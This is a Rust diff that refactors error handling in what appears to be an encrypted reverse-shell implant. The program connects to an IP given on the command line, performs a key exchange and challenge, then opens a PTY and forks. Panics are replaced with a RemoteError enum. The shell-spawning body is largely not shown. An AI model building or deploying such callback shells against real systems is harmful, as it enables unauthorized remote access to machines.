@@ -42,18 +42,6 @@ fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
 	}
 }
 
-// The ecdh library expects the PEM in a certain format
-//  use this function to convert from straight b64 to
-//  the expected format.
-fn format_public_key(b64_sec1: &str) -> ([u8; 1024], usize) {
-	let mut rebuilt = [0u8; 1024];
-	let size = {
-		let s = Base64::decode(b64_sec1, &mut rebuilt).unwrap();
-		s.len()
-	};
-	(rebuilt, size)
-}
-
 // This struct implementation duplicates nix's pty struct
 // implementation. It's a very thin layer around a RawFd, but makes
 // certain that you can read to and write from it.
@@ -181,32 +169,59 @@ fn no_printf_ptsname_r(
 	}
 }
 
-#[cfg_attr(not(test), no_mangle)]
-pub fn main(
+// These errors exist to prevent panics in the remote main function
+#[derive(Error, Debug)]
+enum RemoteError {
+	#[error("Invalid argv entries.")]
+	Arguments,
+	#[error("Invalid IP")]
+	ArgumentsIP,
+	#[error("Invalid public key")]
+	ArgumentsKey,
+	#[error("Unable to connect")]
+	Connect,
+	#[error("Failed key exchange")]
+	KEX,
+	#[error("Auth challenge")]
+	Challenge,
+	#[error("Unable to open PTY")]
+	PTY,
+	#[error("Unable to fork")]
+	Fork,
+}
+
+fn main_wrapper(
 	argc: i32,
 	argv: *const *const c_char,
 	envp: *const *const u8,
-) -> i8 {
+) -> Result<i8, RemoteError> {
 	// Check that we have the args
 	if argc < 3 {
-		return 1;
+		return Err(RemoteError::Arguments);
 	}
 
 	// Parse argv
 	let argv_ptrs =
 		unsafe { std::slice::from_raw_parts(argv, argc as usize) };
-	let ip_str =
-		unsafe { CStr::from_ptr(argv_ptrs[1]).to_str().unwrap() };
-	let key_str =
-		unsafe { CStr::from_ptr(argv_ptrs[2]).to_str().unwrap() };
+	let ip_str = unsafe { CStr::from_ptr(argv_ptrs[1]) }
+		.to_str()
+		.or(Err(RemoteError::Arguments))?;
+	let key_str = unsafe { CStr::from_ptr(argv_ptrs[2]) }
+		.to_str()
+		.or(Err(RemoteError::Arguments))?;
 	// Parse the IP
 	let ipaddr_l: Ipv4Addr =
-		ip_str.parse().expect("Failed to parse IP");
+		ip_str.parse().or(Err(RemoteError::ArgumentsIP))?;
 	// Parse the public key which should just be the base64 component
 	//  on a single line
-	let (rebuilt, rebuilt_sz) = format_public_key(&key_str);
+	let mut rebuilt = [0u8; 1024];
+	let rebuilt_sz = {
+		let s = Base64::decode(&key_str, &mut rebuilt)
+			.or(Err(RemoteError::ArgumentsKey))?;
+		s.len()
+	};
 	let pub_l = PublicKey::from_sec1_bytes(&rebuilt[..rebuilt_sz])
-		.expect("Failed to parse public key");
+		.or(Err(RemoteError::ArgumentsKey))?;
 
 	debug!(
 		"Found local's key:\n{:?}\nAnd address: {:#}",
@@ -224,10 +239,10 @@ pub fn main(
 	// Open the socket to remote
 	let addr = SocketAddr::from((ipaddr_l, LOCAL_PORT));
 	let mut remote =
-		TcpStream::connect(addr).expect("Unable to connect.");
+		TcpStream::connect(addr).or(Err(RemoteError::Connect))?;
 	// Get the shared AES key
 	let key = play_dh_kex_remote(&mut remote, &pub_l, seed1)
-		.expect("Failed KEX");
+		.or(Err(RemoteError::KEX))?;
 
 	// Create a new rng for the challenge and nonce values
 	let mut rng = if let Some(seed2) =
@@ -241,7 +256,7 @@ pub fn main(
 
 	// Challenge the remote
 	play_auth_challenge_remote(&mut remote, &pub_l, &mut rng)
-		.expect("Failed challenge");
+		.or(Err(RemoteError::Challenge))?;
 
 	// TODO: unregister SIGALRM
 
@@ -259,7 +274,7 @@ pub fn main(
 		panic!("Unable to unlockpt");
 	}
 	match unsafe { libc::fork() } {
-		-1 => panic!("Unable to fork"),
+		-1 => return Err(RemoteError::Fork),
 		0 => {
 			// Child:
 			//  - create a new session and set the controlling
@@ -361,8 +376,17 @@ pub fn main(
 				}
 			}
 		}
-	};
-	return 0;
+	}
+	Ok(0)
+}
+
+#[cfg_attr(not(test), no_mangle)]
+pub fn main(
+	argc: i32,
+	argv: *const *const c_char,
+	envp: *const *const u8,
+) -> i8 {
+	main_wrapper(argc, argv, envp).unwrap_or(-1)
 }
 
 fn exit_on_sigchld(
